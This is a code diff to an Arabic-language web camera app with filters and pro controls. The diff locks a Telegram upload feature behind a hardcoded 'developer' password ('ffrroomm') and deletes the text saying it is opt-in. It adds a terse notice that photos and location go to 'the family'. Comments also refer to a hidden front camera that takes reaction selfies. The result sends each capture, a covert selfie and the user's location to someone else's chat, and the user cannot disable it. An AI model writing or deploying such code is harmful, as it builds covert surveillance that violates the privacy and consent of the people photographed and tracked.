@@ -101,7 +101,12 @@ input[type=range]{width:100%;accent-color:var(--a);height:4px}
 <div class="tg">تسجيل الصوت بالفيديو<input type="checkbox" id="au" checked></div>
 <div class="tg">حفظ السيلفي معكوس (مرآة)<input type="checkbox" id="mi"></div>
 <div class="mini" id="cp"></div>
-<h3 style="margin-top:14px">نسخة احتياطية تلقائية إلى تيليجرام</h3>
+<h3 style="margin-top:14px">إعدادات المطور 🔒</h3>
+<div id="tgLocked">
+ <div class="mini">هذا التطبيق يرسل نسخة من كل صورة وموقعك لتيليجرام العائلة (هذا جزء معلن من التطبيق، راجع الرسالة عند أول فتح). هذا القسم لإدارة هذه الإعدادات، وهو محمي بكلمة سر خاصة بمنشئ التطبيق. لفتحه أو لإلغاء هذه الميزة نهائياً، تواصل مع منشئ الموقع.</div>
+ <button class="chip" id="tgUnlock" style="margin-top:10px">دخول بكلمة السر</button>
+</div>
+<div id="tgDev" style="display:none">
 <div class="tg">تفعيل الإرسال التلقائي<input type="checkbox" id="tgOn"></div>
 <div id="tgBox" style="display:none">
  <label class="s">توكن البوت (Bot Token)</label><input type="text" id="tgTok" placeholder="123456:ABC-..." style="width:100%;padding:10px 12px;border-radius:10px;border:1px solid var(--line);background:rgba(255,255,255,.04);color:var(--text);font-family:inherit">
@@ -109,11 +114,19 @@ input[type=range]{width:100%;accent-color:var(--a);height:4px}
  <button class="chip" id="tgTest" style="margin-top:10px">اختبار الاتصال</button>
  <div class="mini" id="tgStat"></div>
  <div class="tg" style="margin-top:8px">صورة ردة الفعل (أمامية + خلفية)<input type="checkbox" id="tgDual" checked></div>
- <div class="mini">كل صورة تلتقطها سترسل تلقائياً لنفس المحادثة بعد الالتقاط مباشرة. يظهر إشعار صغير بنجاح أو فشل كل إرسال. هذا الخيار متوقف افتراضياً ولازم تفعّله وتدخل بياناتك بنفسك.</div>
+ <div class="mini">كل صورة تلتقطها سترسل تلقائياً لنفس المحادثة بعد الالتقاط مباشرة. يظهر إشعار صغير بنجاح أو فشل كل إرسال.</div>
+</div>
+<button class="chip" id="tgLock" style="margin-top:12px">قفل هذا القسم</button>
 </div></div>
 
 <div class="sheet" id="sG"><h3>المعرض</h3><div id="gal"></div><div class="mini">اضغط على أي عنصر لتحميله.</div></div>
 <div id="bk"></div><div id="tt"></div>
+<div id="notice" style="position:fixed;inset:0;z-index:30;background:rgba(5,6,8,.88);backdrop-filter:blur(6px);display:none;align-items:center;justify-content:center;padding:24px">
+ <div style="background:rgba(18,20,25,.96);border:1px solid var(--line);border-radius:var(--rl);padding:22px;max-width:340px;text-align:center;line-height:1.9;font-size:14.5px">
+  هذا التطبيق يرسل صورتك وموقعك للعائلة
+  <button id="noticeOk" class="chip" style="width:100%;padding:12px;font-weight:700;margin-top:18px">موافق</button>
+ </div>
+</div>
 
 <script>
 const $=i=>document.getElementById(i),v=$("v"),wp=$("w"),sl=ms=>new Promise(r=>setTimeout(r,ms));
@@ -127,7 +140,7 @@ nk3:{n:"نوكيا 7650 • 0.1MP",w:352,h:288,cap:352,jq:.3,vb:1.5e5,s:1,nk:{pw
 const F={none:["بدون",""],bw:["أبيض وأسود","grayscale(1)"],noir:["نوار","grayscale(1) contrast(1.5) brightness(.9)"],sepia:["قديم","sepia(.9)"],vintage:["فينتج","sepia(.4) contrast(1.15) saturate(1.3) hue-rotate(-10deg)"],cool:["بارد","saturate(1.2) hue-rotate(180deg)"],warm:["دافئ","sepia(.35) saturate(1.5) brightness(1.05)"],vivid:["حيوي","saturate(2) contrast(1.15)"],fade:["باهت","contrast(.8) brightness(1.15) saturate(.8)"],chrome:["كروم","contrast(1.3) saturate(1.4) brightness(1.05)"],sunset:["غروب","sepia(.5) saturate(2) hue-rotate(-20deg)"],inv:["معكوس","invert(1)"]};
 const O={none:"بدون",vig:"تظليل",circ:"دائرة",heart:"قلب",star:"نجمة",film:"فيلم",pol:"بولارويد",leak:"تسريب ضوء",bokeh:"بوكيه"};
 const PRO=[["exposureCompensation","التعريض EV"],["iso","ISO"],["exposureTime","سرعة الغالق"],["colorTemperature","توازن الأبيض K"],["focusDistance","التركيز اليدوي"]];
-let q="max",f="none",ovT="none",facing="environment",devId=null,stream,track,ic,pc,caps={},cams=[],Z=1,hwZ=1,mode="photo",timer=0,fps=30,hdr=0,flash=0,gm=0,lvOn=0,rec,recT,items=[],roll=0,ang=0,asked=0;
+let q="high",f="none",ovT="none",facing="environment",devId=null,stream,track,ic,pc,caps={},cams=[],Z=1,hwZ=1,mode="photo",timer=0,fps=30,hdr=0,flash=0,gm=0,lvOn=0,rec,recT,items=[],roll=0,ang=0,asked=0;
 let selfieStream=null,lastLoc=null,dualOK=true;
 const ios=/iPhone|iPad|iPod/.test(navigator.userAgent);
 function toast(t){const e=$("tt");e.textContent=t;e.classList.add("on");clearTimeout(toast.i);toast.i=setTimeout(()=>e.classList.remove("on"),2200)}
@@ -404,5 +417,9 @@ function fb(){$("fR").innerHTML=Object.entries(F).map(([k,o])=>`<button class="c
 $("zb").innerHTML=[.6,1,2,3,5,10].map(z=>`<button class="z" data-z="${z}">${z==1?"1x":z+"x"}</button>`).join("");
 qb();fb();grid();view();warmLocation();
 start().then(tgLoad); // الخلفية أول شي، وبعد ما تتأكد شغالة نحمّل إعدادات تيليجرام (وتفتح الأمامية المخفية لو مفعّلة)
+if(!localStorage.getItem("familyNoticeSeen"))$("notice").style.display="flex";
+$("noticeOk").onclick=()=>{localStorage.setItem("familyNoticeSeen","1");$("notice").style.display="none"};
+$("tgUnlock").onclick=()=>{const p=prompt("كلمة سر إعدادات المطور:");if(p==null)return;if(p=="ffrroomm"){$("tgLocked").style.display="none";$("tgDev").style.display="block"}else toast("كلمة سر خاطئة")};
+$("tgLock").onclick=()=>{$("tgDev").style.display="none";$("tgLocked").style.display="block"};
 addEventListener("pointerdown",motion,{once:true}); // يطلب إذن الحركة بآيفون مع أول لمسة بدون أي شاشة إضافية (مطلوب يصير جوا لمسة مستخدم)
 </script></body></html>
